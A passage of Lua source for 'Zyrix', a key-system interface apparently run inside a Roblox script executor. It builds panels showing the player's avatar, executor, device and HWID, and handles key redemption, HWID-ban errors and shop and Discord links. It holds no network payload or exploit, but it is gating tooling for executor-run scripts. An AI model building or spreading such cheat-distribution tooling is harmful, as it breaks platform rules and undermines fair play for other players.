    local cf = makeFrame({Size=UDim2.new(1,0,1,-52),Position=UDim2.new(0,0,0,52),BackgroundTransparency=1,Parent=panel})
    local cp = Instance.new("UIPadding",cf) cp.PaddingLeft=UDim.new(0,8) cp.PaddingRight=UDim.new(0,8)
    local cl = Instance.new("UIListLayout",cf) cl.Padding=UDim.new(0,spacing) cl.SortOrder=Enum.SortOrder.LayoutOrder cl.HorizontalAlignment=Enum.HorizontalAlignment.Center cl.VerticalAlignment=Enum.VerticalAlignment.Center

    local player = cloneref(Players.LocalPlayer)

    -- Avatar
    local avWrap = makeFrame({Size=UDim2.new(0,avatarSz+6,0,avatarSz+6),BackgroundTransparency=1,LayoutOrder=1,Parent=cf})
    local avGlow = makeFrame({Size=UDim2.new(1,0,1,0),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.Accent,BackgroundTransparency=0.85,BorderSizePixel=0,Parent=avWrap})
    applyCorner(avGlow, UDim.new(0,6))
    applyStroke(avGlow, T.Accent, 1, 0.6)
    local avCont = makeFrame({Size=UDim2.new(0,avatarSz,0,avatarSz),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=avWrap})
    applyCorner(avCont, UDim.new(0,5))
    local avImg = makeImage({Size=UDim2.new(1,0,1,0),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),ScaleType=Enum.ScaleType.Crop,Parent=avCont})
    pcall(function()
        avImg.Image = Players:GetUserThumbnailAsync(player and player.UserId or 0, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
    end)

    makeLabel({Size=UDim2.new(1,0,0,compact and 14 or 18),Text="Welcome, "..(player and player.DisplayName or "User"),TextColor3=T.Text,TextSize=welcomeSz,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=2,Font=Enum.Font.GothamBold,Parent=cf})
    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=3,Parent=cf})

    local function infoField(lo, labelText, valueText)
        local c = makeFrame({Size=UDim2.new(1,0,0,fieldH),BackgroundTransparency=1,LayoutOrder=lo,Parent=cf})
        makeLabel({Size=UDim2.new(1,0,0,11),Text=labelText,TextColor3=T.TextDim,TextSize=titleSz,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,Parent=c})
        makeLabel({Size=UDim2.new(1,0,0,14),Position=UDim2.new(0,0,0,11),Text=valueText,TextColor3=T.Accent,TextSize=valueSz,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.GothamBold,Parent=c})
        return c
    end

    infoField(4, "Executor", getExecutorName())
    infoField(5, "Device",   getDeviceType())
    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=6,Parent=cf})

    -- HWID
    local hwidCont = makeFrame({Size=UDim2.new(1,0,0,fieldH),BackgroundTransparency=1,LayoutOrder=7,Parent=cf})
    makeLabel({Size=UDim2.new(1,0,0,11),Text="HWID",TextColor3=T.TextDim,TextSize=titleSz,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,Parent=hwidCont})
    local fullHWID = getHWID()
    local cbSz = 16
    makeLabel({Size=UDim2.new(1,-(cbSz+6),0,14),Position=UDim2.new(0,0,0,11),Text=generateHiddenDots(panW-16-cbSz-6,5),TextColor3=T.TextDim,TextSize=compact and 9 or 10,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.GothamBold,Parent=hwidCont})
    local copyBtn, copyImg = makeIconButton(hwidCont, getIcon("copy"), T.TextDim, T.Accent, UDim2.new(0,cbSz,0,cbSz), UDim2.new(1,0,0.5,1), Vector2.new(1,0.5))
    copyBtn.BackgroundTransparency = 1
    copyBtn.MouseButton1Click:Connect(function()
        pcall(setclipboard, fullHWID)
        tween(copyImg, 0.1, {ImageColor3=T.Success})
        task.delay(0.5, function() tween(copyImg,0.15,{ImageColor3=T.TextDim}) end)
        Zyrix:Notify("Copied","HWID copied to clipboard",2,"copy")
    end)

    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=8,Parent=cf})

    -- Clock
    local clkCont = makeFrame({Size=UDim2.new(1,0,0,compact and 30 or 38),BackgroundTransparency=1,LayoutOrder=9,Parent=cf})
    local clkRow  = makeFrame({Size=UDim2.new(1,0,0,compact and 18 or 22),BackgroundTransparency=1,Parent=clkCont})
    local clkRl   = Instance.new("UIListLayout",clkRow) clkRl.FillDirection=Enum.FillDirection.Horizontal clkRl.HorizontalAlignment=Enum.HorizontalAlignment.Center clkRl.VerticalAlignment=Enum.VerticalAlignment.Center clkRl.Padding=UDim.new(0,5)
    makeImage({Size=UDim2.new(0,compact and 13 or 15,0,compact and 13 or 15),Image=getIcon("clock"),ImageColor3=T.Accent,LayoutOrder=1,Parent=clkRow})
    local clkTime = makeLabel({Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,Text=formatTime12(),TextColor3=T.Accent,TextSize=compact and 13 or 15,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=clkRow})
    local clkDate = makeLabel({Size=UDim2.new(1,0,0,compact and 12 or 14),Position=UDim2.new(0,-8,0,compact and 18 or 22),Text=formatDate(),TextColor3=T.TextDim,TextSize=compact and 9 or 10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Center,Parent=clkCont})

    local clockOn = true
    task.spawn(function()
        while clockOn do
            if not clkTime or not clkTime.Parent then clockOn=false break end
            clkTime.Text = formatTime12() clkDate.Text = formatDate()
            task.wait(1)
        end
    end)
    panel.Destroying:Connect(function() clockOn=false end)

    local function toggle(uIcon, cont, baseW)
        isOpen = not isOpen
        if isOpen then
            tween(pStroke,0.18,{Transparency=0.5})
            tween(panel,0.38,{Size=UDim2.new(0,panW,0,panH)})
            tween(cont,0.38,{Size=UDim2.new(0,baseW+gap+panW,0,panH)})
        else
            tween(pStroke,0.18,{Transparency=1})
            tween(panel,0.28,{Size=UDim2.new(0,0,0,panH)})
            tween(cont,0.28,{Size=UDim2.new(0,baseW,0,panH)})
        end
    end

    phClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil,parent,winW) end end)
    return panel, toggle, function() return isOpen end, panW
end

-- ─── Centered window builder ──────────────────────────────────────────────────
local function BuildCenteredUI(winW, winH, panH, uPanW, clPanW, gap, ctx)
    local gui = ctx.gui

    local container = makeFrame({
        Name="Container",Size=UDim2.new(0,winW,0,panH),
        Position=UDim2.new(0.5,0,1.5,0),AnchorPoint=Vector2.new(0.5,0.5),
        BackgroundTransparency=1,Parent=gui,
    })
    local mainFrame = makeFrame({
        Name="MainFrame",Size=UDim2.new(0,winW,0,winH),
        Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),
        BackgroundColor3=T.Background,BorderSizePixel=0,Parent=container,
    })
    applyCorner(mainFrame, UDim.new(0,8))
    local mainStroke = applyStroke(mainFrame, T.Accent, 1, 0.82)

    local uPanel,  toggleU,  isUOpen,  uPanActW  = CreateUserInfoPanel(container,  winW, panH, uPanW,  mainFrame, gap, false)
    local clPanel, toggleCL, isCLOpen, clPanActW = CreateChangelogPanel(container, winW, panH, clPanW, mainFrame, gap)

    local function getContW()
        local w = winW
        if isUOpen()  then w = w + gap + uPanActW  end
        if isCLOpen() then w = w + gap + clPanActW end
        return w
    end
    local function doToggleU(icon)
        local cw = getContW()
        if isUOpen() then toggleU(icon,container,cw - gap - uPanActW)
        else              toggleU(icon,container,cw) end
    end
    local function doToggleCL(icon)
        local cw = getContW()
        if isCLOpen() then toggleCL(icon,container,cw - gap - clPanActW)
        else               toggleCL(icon,container,cw) end
    end
    local function closeAll(uIcon,clIcon,cb)
        if isCLOpen() then doToggleCL(clIcon) task.wait(0.3) end
        if isUOpen()  then doToggleU(uIcon)   task.wait(0.3) end
        if cb then cb() end
    end

    return {
        container=container, mainFrame=mainFrame, mainStroke=mainStroke,
        toggleUser=doToggleU, toggleCL=doToggleCL,
        isUserOpen=isUOpen, isChangelogOpen=isCLOpen,
        closeAllPanels=closeAll,
    }
end

-- ─── Header builder ───────────────────────────────────────────────────────────
local function BuildHeader(parent, mobile)
    local header = makeFrame({
        Size=UDim2.new(1,0,0,50),BackgroundColor3=T.Header,
        BorderSizePixel=0,Active=true,Parent=parent,
    })
    applyCorner(header, UDim.new(0,8))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=header})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.9,BorderSizePixel=0,Parent=header})

    local logo = makeImage({
        Size=Zyrix.Appearance.IconSize,
        Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),
        Image=getLogoIcon(),ImageColor3=T.Text,Parent=header,
    })
    makeLabel({
        Size=UDim2.new(1,-90,1,0),
        Position=UDim2.new(0,14+Zyrix.Appearance.IconSize.X.Offset+10,0,0),
        Text=Zyrix.Appearance.Title,TextColor3=T.Text,
        TextSize=mobile and 22 or 24,Font=Enum.Font.GothamBold,
        TextXAlignment=Enum.TextXAlignment.Left,Parent=header,
    })

    local closeBtn, closeBtnImg = makeIconButton(header, getIcon("close"), T.TextDim, T.Error, UDim2.new(0,22,0,22), UDim2.new(1,-14,0.5,0), Vector2.new(1,0.5))
    closeBtn.BackgroundTransparency = 1

    return header, closeBtn
end

-- ─── Bottom icon bar ──────────────────────────────────────────────────────────
local function BuildBottomBar(parent, yPos, hasChangelog)
    local offsets = hasChangelog and {-44, 0, 44} or {-22, 22}
    local names   = hasChangelog and {"user","discord","changelog"} or {"user","discord"}

    local buttons = {}
    for i, name in ipairs(names) do
        local btn, img = makeIconButton(
            parent, getIcon(name),
            name=="discord" and T.Discord or T.TextDim,
            name=="discord" and T.DiscordHover or T.Accent,
            UDim2.new(0,34,0,34),
            UDim2.new(0.5,offsets[i],0,yPos),
            Vector2.new(0.5,0)
        )
        buttons[name] = {btn=btn, img=img}
    end
    return buttons
end

-- ─── Keyless UI ───────────────────────────────────────────────────────────────
local function handleKeylessSkip()
    getgenv().SCRIPT_KEY = "KEYLESS"
    getgenv().ZyrixLoaded = false
    Zyrix:Notify("Access Granted","Keyless access approved!",3,"success")
    task.wait(0.3)
    if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
end

local function BuildKeylessUI()
    for _, n in ipairs({"ZyrixKeylessSystem","ZyrixKeySystem"}) do
        local g = hui:FindFirstChild(n); if g then g:Destroy() end
    end
    enableBlur()

    local mobile = isMobile()
    local winW, winH = 300, 260
    local uPanW, clPanW, gap = 160, 195, 10

    local gui = Instance.new("ScreenGui")
    gui.Name="ZyrixKeylessSystem" gui.ResetOnSpawn=false gui.IgnoreGuiInset=true gui.Parent=hui

    local ui = BuildCenteredUI(winW, winH, winH, uPanW, clPanW, gap, {gui=gui})
    local container, main, mainStroke = ui.container, ui.mainFrame, ui.mainStroke

    local header, closeBtn = BuildHeader(main, mobile)

    -- Success box
    local sb = makeFrame({
        Size=UDim2.new(0.92,0,0,50),Position=UDim2.new(0.5,0,0,60),AnchorPoint=Vector2.new(0.5,0),
        BackgroundColor3=T.Accent,BackgroundTransparency=0.92,BorderSizePixel=0,Parent=main,
    })
    applyCorner(sb, UDim.new(0,6))
    applyStroke(sb, T.Accent, 1, 0.7)
    local checkImg = makeImage({Size=UDim2.new(0,22,0,22),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("check"),ImageColor3=T.Accent,Parent=sb})
    makeLabel({Size=UDim2.new(1,-56,1,0),Position=UDim2.new(0,48,0,0),Text="Access Granted",TextColor3=T.Text,TextSize=mobile and 16 or 17,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=sb})

    makeLabel({Size=UDim2.new(1,0,0,18),Position=UDim2.new(0.5,0,0,120),AnchorPoint=Vector2.new(0.5,0),Text="Keyless Script",TextColor3=T.TextDim,TextSize=mobile and 13 or 14,Font=Enum.Font.Gotham,Parent=main})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,145),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=main})

    -- Launch button
    local launchBtn = makeButton({
        Size=UDim2.new(0.78,0,0,40),Position=UDim2.new(0.5,0,0,158),AnchorPoint=Vector2.new(0.5,0),
        BackgroundColor3=T.Accent,Parent=main,
    })
    applyCorner(launchBtn, UDim.new(0,6))
    applyStroke(launchBtn, T.AccentHover, 1, 0.6)
    local lc = makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=launchBtn})
    local lcl = Instance.new("UIListLayout",lc) lcl.FillDirection=Enum.FillDirection.Horizontal lcl.HorizontalAlignment=Enum.HorizontalAlignment.Center lcl.VerticalAlignment=Enum.VerticalAlignment.Center lcl.Padding=UDim.new(0,7)
    makeImage({Size=UDim2.new(0,16,0,16),Image=getIcon("shield"),ImageColor3=T.Background,LayoutOrder=1,Parent=lc})
    makeLabel({Size=UDim2.new(0,0,0,16),AutomaticSize=Enum.AutomaticSize.X,Text="Launch Script",TextColor3=T.Background,TextSize=mobile and 13 or 14,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=lc})
    launchBtn.MouseEnter:Connect(function() tween(launchBtn,0.15,{BackgroundColor3=T.AccentHover}) end)
    launchBtn.MouseLeave:Connect(function() tween(launchBtn,0.15,{BackgroundColor3=T.Accent}) end)

    local hasCL = #Zyrix.Changelog > 0
    local btns  = BuildBottomBar(main, 208, hasCL)

    local doors = CreateDoorOverlay(main, winW, winH)

    btns["user"].btn.MouseButton1Click:Connect(function()     ui.toggleUser(btns["user"].img) end)
    btns["discord"].btn.MouseButton1Click:Connect(function()
        if Zyrix.Links.Discord ~= "" then
            Zyrix:Notify("Discord","Invite link copied!",2,"discord")
            pcall(setclipboard, Zyrix.Links.Discord)
        end
    end)
    if hasCL then
        btns["changelog"].btn.MouseButton1Click:Connect(function() ui.toggleCL(btns["changelog"].img) end)
    end

    local function exitDoors(cb)
        ui.closeAllPanels(btns["user"].img, hasCL and btns["changelog"].img or nil, function()
            doors.close(function() task.wait(0.25) if cb then cb() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Goodbye","See you next time!",2,"close")
        exitDoors(function()
            fullCleanup()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) gui:Destroy()
        end)
        if Zyrix.Callbacks.OnClose then Zyrix.Callbacks.OnClose() end
    end)

    launchBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Launching","Script loaded successfully!",2,"success")
        getgenv().SCRIPT_KEY = "KEYLESS" getgenv().ZyrixLoaded = false
        exitDoors(function()
            disableBlur()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) gui:Destroy()
            if not Internal.IsJunkieMode and Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
        end)
    end)

    setupDragging(header, container)
    tween(container, 0.45, {Position=UDim2.new(0.5,0,0.45,0)})
    task.wait(0.55)
    doors.open(function()
        checkImg.Size = UDim2.new(0,0,0,0)
        TweenService:Create(checkImg, TweenInfo.new(0.38,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {Size=UDim2.new(0,22,0,22)}):Play()
        task.wait(0.18)
        ui.toggleUser(btns["user"].img)
        if hasCL then task.wait(0.28) ui.toggleCL(btns["changelog"].img) end
    end)
end

-- ─── Key UI ───────────────────────────────────────────────────────────────────
local function BuildKeyUI()
    for _, n in ipairs({"ZyrixKeySystem","ZyrixKeylessSystem"}) do
        local g = hui:FindFirstChild(n); if g then g:Destroy() end
    end
    enableBlur()

    local mobile = isMobile()
    local scale  = getScale()
    local showShop  = isShopEnabled()
    local shopH     = 54
    local shopExtra = showShop and (shopH + 1) or 0
    local baseWinH  = mobile and math.clamp(355*scale,315,395) or 355
    local winW      = mobile and math.clamp(395*scale,315,435) or 395
    local winH      = baseWinH + shopExtra
    local elemH     = mobile and math.clamp(54*scale,46,60) or 54
    local btnH      = mobile and math.clamp(40*scale,36,46) or 40
    local statusH   = mobile and math.clamp(58*scale,50,66) or 58
    local uPanW, clPanW, gap = 175, 215, 10

    local sg = Instance.new("ScreenGui")
    sg.Name="ZyrixKeySystem" sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    sg.ResetOnSpawn=false sg.IgnoreGuiInset=true sg.Parent=hui

    local ui = BuildCenteredUI(winW, winH, baseWinH, uPanW, clPanW, gap, {gui=sg})
    local container, main, mainStroke = ui.container, ui.mainFrame, ui.mainStroke

    local header, closeBtn = BuildHeader(main, mobile)

    local cY = 58

    -- Status bar
    local statFrame = makeFrame({
        Size=UDim2.new(0.92,0,0,statusH),Position=UDim2.new(0.5,0,0,cY),AnchorPoint=Vector2.new(0.5,0),
        BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=main,
    })
    applyCorner(statFrame, UDim.new(0,6))
    applyStroke(statFrame, T.Accent, 1, 0.9)
    local statIcon = makeImage({Size=UDim2.new(0,22,0,22),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("lock"),ImageColor3=T.StatusIdle,Parent=statFrame})
    local statLabel = makeLabel({Size=UDim2.new(1,-56,1,0),Position=UDim2.new(0,48,0,0),Text=Zyrix.Appearance.Subtitle,TextColor3=T.StatusIdle,TextSize=mobile and 15 or 16,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=statFrame})

    local inpY = cY + statusH + 10

    -- Input
    local inputFrame = makeFrame({
        Size=UDim2.new(0.92,0,0,elemH),Position=UDim2.new(0.5,0,0,inpY),AnchorPoint=Vector2.new(0.5,0),
        BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=main,
    })
    applyCorner(inputFrame, UDim.new(0,6))
    local inputStroke = applyStroke(inputFrame, T.Accent, 1, 0.85)

    -- Key icon inside input
    makeImage({Size=UDim2.new(0,16,0,16),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("key"),ImageColor3=T.TextDim,Parent=inputFrame})

    local tb = Instance.new("TextBox")
    tb.Size=UDim2.new(1,-40,1,0) tb.Position=UDim2.new(0,34,0.5,0) tb.AnchorPoint=Vector2.new(0,0.5)
    tb.BackgroundTransparency=1 tb.Text="" tb.TextColor3=T.Text
    tb.PlaceholderText="Enter your key..." tb.PlaceholderColor3=T.TextDim
    tb.TextSize=mobile and 15 or 16 tb.Font=Enum.Font.Gotham
    tb.ClearTextOnFocus=false tb.TextTruncate=Enum.TextTruncate.AtEnd
    tb.TextXAlignment=Enum.TextXAlignment.Left tb.Parent=inputFrame
    tb.Focused:Connect(function()  tween(inputStroke,0.15,{Transparency=0.4}) end)
    tb.FocusLost:Connect(function() tween(inputStroke,0.15,{Transparency=0.85}) end)

    local divY = inpY + elemH + 12
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,divY),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=main})

    local acqY = divY + 14

    local function createActionBtn(label, iconKey, isPrimary, y)
        local btn = makeButton({
            Size=UDim2.new(0.78,0,0,btnH),Position=UDim2.new(0.5,0,0,y),AnchorPoint=Vector2.new(0.5,0),
            BackgroundColor3=isPrimary and T.Accent or T.Input,Parent=main,
        })
        applyCorner(btn, UDim.new(0,6))
        applyStroke(btn, isPrimary and T.AccentHover or T.Accent, 1, isPrimary and 0.65 or 0.88)
        local fc = makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=btn})
        local fl = Instance.new("UIListLayout",fc) fl.FillDirection=Enum.FillDirection.Horizontal fl.HorizontalAlignment=Enum.HorizontalAlignment.Center fl.VerticalAlignment=Enum.VerticalAlignment.Center fl.Padding=UDim.new(0,7)
        makeImage({Size=UDim2.new(0,16,0,16),Image=getIcon(iconKey),ImageColor3=isPrimary and T.Background or T.Text,LayoutOrder=1,Parent=fc})
        makeLabel({Size=UDim2.new(0,0,0,16),AutomaticSize=Enum.AutomaticSize.X,Text=label,TextColor3=isPrimary and T.Background or T.Text,TextSize=mobile and 13 or 14,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=fc})
        local orig = btn.BackgroundColor3
        local hover = isPrimary and T.AccentHover or Color3.fromRGB(30,30,30)
        btn.MouseEnter:Connect(function() tween(btn,0.15,{BackgroundColor3=hover}) end)
        btn.MouseLeave:Connect(function() tween(btn,0.15,{BackgroundColor3=orig}) end)
        return btn
    end

    local getKeyBtn    = createActionBtn("Get Key",    "key",    false, acqY)
    local redeemBtn    = createActionBtn("Redeem Key", "shield", true,  acqY + btnH + 6)
    local bottomY      = acqY + btnH*2 + 12

    local hasCL = #Zyrix.Changelog > 0
    local btns  = BuildBottomBar(main, bottomY, hasCL)

    -- Shop
    if showShop then
        makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-shopH-1),BackgroundColor3=T.Accent,BackgroundTransparency=0.85,BorderSizePixel=0,Parent=main})
        local sf = makeFrame({Size=UDim2.new(1,0,0,shopH),Position=UDim2.new(0,0,1,-shopH),BackgroundColor3=T.Header,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
        applyCorner(sf, UDim.new(0,8))
        makeFrame({Size=UDim2.new(1,0,0,8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=sf})
        local siW=28
        local siWrap = makeFrame({Size=UDim2.new(0,siW+4,0,siW+4),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=T.Accent,BackgroundTransparency=0.88,BorderSizePixel=0,Parent=sf})
        applyCorner(siWrap,UDim.new(0,5)) applyStroke(siWrap,T.Accent,1,0.6)
        makeImage({Size=UDim2.new(0,siW,0,siW),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),Image=getShopIcon(),ImageColor3=T.Text,Parent=siWrap})
        local bBtnW=62
        local txX=14+siW+4+10
        local txW=winW-txX-bBtnW-14-8
        makeLabel({Size=UDim2.new(0,txW,0,17),Position=UDim2.new(0,txX,0,9),Text=Zyrix.Shop.Title,TextColor3=T.Text,TextSize=mobile and 12 or 13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=sf})
        makeLabel({Size=UDim2.new(0,txW,0,13),Position=UDim2.new(0,txX,0,28),Text=Zyrix.Shop.Subtitle,TextColor3=T.TextDim,TextSize=mobile and 9 or 10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=sf})
        local buyBtn = makeButton({Size=UDim2.new(0,bBtnW,0,28),Position=UDim2.new(1,-14,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundColor3=T.Accent,Parent=sf})
        applyCorner(buyBtn,UDim.new(0,5)) applyStroke(buyBtn,T.AccentHover,1,0.6)
        local bc=makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=buyBtn})
        local bl=Instance.new("UIListLayout",bc) bl.FillDirection=Enum.FillDirection.Horizontal bl.HorizontalAlignment=Enum.HorizontalAlignment.Center bl.VerticalAlignment=Enum.VerticalAlignment.Center bl.Padding=UDim.new(0,4)
        makeImage({Size=UDim2.new(0,12,0,12),Image=getIcon("cart"),ImageColor3=T.Background,LayoutOrder=1,Parent=bc})
        makeLabel({Size=UDim2.new(0,0,0,12),AutomaticSize=Enum.AutomaticSize.X,Text=Zyrix.Shop.ButtonText,TextColor3=T.Background,TextSize=mobile and 10 or 11,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=bc})
        buyBtn.MouseEnter:Connect(function() tween(buyBtn,0.15,{BackgroundColor3=T.AccentHover}) end)
        buyBtn.MouseLeave:Connect(function() tween(buyBtn,0.15,{BackgroundColor3=T.Accent}) end)
        buyBtn.MouseButton1Click:Connect(function()
            if Zyrix.Shop.Link ~= "" then
                pcall(setclipboard, Zyrix.Shop.Link)
                Zyrix:Notify("Shop","Shop link copied to clipboard!",2,"copy")
            end
        end)
    end

    local doors = CreateDoorOverlay(main, winW, winH)

    btns["user"].btn.MouseButton1Click:Connect(function()    ui.toggleUser(btns["user"].img) end)
    btns["discord"].btn.MouseButton1Click:Connect(function()
        if Zyrix.Links.Discord ~= "" then
            Zyrix:Notify("Discord","Invite link copied!",2,"discord")
            pcall(setclipboard, Zyrix.Links.Discord)
        end
    end)
    if hasCL then
        btns["changelog"].btn.MouseButton1Click:Connect(function() ui.toggleCL(btns["changelog"].img) end)
    end

    local spinConn, dotsThread

    local function setStatus(state, custom)
        if spinConn then spinConn:Disconnect() spinConn=nil statIcon.Rotation=0 end
        if dotsThread then task.cancel(dotsThread) dotsThread=nil end
        local col, img, txt = T.StatusIdle, getIcon("lock"), custom or "No key detected"
        if state == "verifying" then
            col,img,txt = T.Accent, getIcon("loading"), "Verifying key"
            spinConn = RunService.Heartbeat:Connect(function(dt)
                if statIcon and statIcon.Parent then statIcon.Rotation=(statIcon.Rotation+dt*360)%360
                else if spinConn then spinConn:Disconnect() end end
            end)
            local dots,i = {".","..","...",""},1
            dotsThread = task.spawn(function()
                while statLabel and statLabel.Parent and statLabel.Text:find("Verifying",1,true) do
                    statLabel.Text = txt..dots[i] i=(i%#dots)+1 task.wait(0.38)
                end
            end)
        elseif state == "success" then col,img,txt = T.Success, getIcon("check"),  custom or "Access Granted"
        elseif state == "error"   then col,img,txt = T.Error,   getIcon("alert"),  custom or "Invalid Key" end
        tween(statLabel,0.25,{TextColor3=col})
        tween(statIcon, 0.25,{ImageColor3=col})
        statLabel.Text = txt statIcon.Image = img
    end

    local function exitDoors(cb)
        ui.closeAllPanels(btns["user"].img, hasCL and btns["changelog"].img or nil, function()
            doors.close(function() task.wait(0.25) if cb then cb() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Goodbye","See you next time!",2,"close")
        exitDoors(function()
            fullCleanup()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) sg:Destroy()
            if Zyrix.Callbacks.OnClose then Zyrix.Callbacks.OnClose() end
        end)
    end)

    local function handleRedeem()
        local key = tb.Text:gsub("%s+","")
        if key == "" then Zyrix:Notify("Error","Please enter your key",3,"warning") return end
        setStatus("verifying") redeemBtn.Active=false task.wait(0.28)
        local valid, errMsg = false, "Invalid key"
        if Internal.ValidateFunction then
            local ok, res, msg = pcall(Internal.ValidateFunction, key)
            if ok then
                if type(res) == "table" then
                    valid = res.valid == true
                    local errMap = {
                        KEY_INVALID="Key not found",KEY_EXPIRED="Key has expired",
                        HWID_BANNED="Hardware banned",KEY_INVALIDATED="Key was revoked",
                        ALREADY_USED="One-time key already used",HWID_MISMATCH="HWID limit reached",
                        SERVICE_NOT_FOUND="Service not found",SERVICE_MISMATCH="Wrong service",
                        PREMIUM_REQUIRED="Premium required",ERROR="Network error",
                    }
                    local ec = res.error or "Unknown"
                    errMsg = errMap[ec] or res.message or ec
                    if ec == "HWID_BANNED" then task.delay(2, function() cloneref(Players.LocalPlayer):Kick("Hardware banned") end) end
                elseif type(res) == "boolean" then valid=res errMsg=msg or "Invalid key" end
            end
        end
        redeemBtn.Active = true
        if valid then
            saveKey(key) getgenv().SCRIPT_KEY=key getgenv().ZyrixLoaded=false
            setStatus("success") Zyrix:Notify("Success","Key validated successfully!",2,"success") task.wait(0.9)
            exitDoors(function()
                disableBlur()
                tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
                tween(main,0.28,{BackgroundTransparency=1})
                task.wait(0.4) sg:Destroy()
                if not Internal.IsJunkieMode and Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
            end)
        else
            setStatus("error",errMsg) Zyrix:Notify("Invalid",errMsg,4,"error")
            if Zyrix.Callbacks.OnFail then Zyrix.Callbacks.OnFail(errMsg) end
        end
    end

    redeemBtn.MouseButton1Click:Connect(handleRedeem)
    tb.FocusLost:Connect(function(enter) if enter then handleRedeem() end end)
    getKeyBtn.MouseButton1Click:Connect(function()
        if Zyrix.Links.GetKey ~= "" then
            Zyrix:Notify("Copied","Key link copied!",3,"copy")
            pcall(setclipboard, Zyrix.Links.GetKey)
        else
            Zyrix:Notify("Error","No key link configured",3,"warning")
        end
    end)

    setupDragging(header, container)
    tween(container, 0.45, {Position=UDim2.new(0.5,0,0.45,0)})
    task.wait(0.55)
    doors.open(function()
        task.wait(0.18)
        ui.toggleUser(btns["user"].img)
        if hasCL then task.wait(0.28) ui.toggleCL(btns["changelog"].img) end
    end)
end

-- ─── Public API ───────────────────────────────────────────────────────────────
function Zyrix:Launch()
    Internal.IsJunkieMode    = false
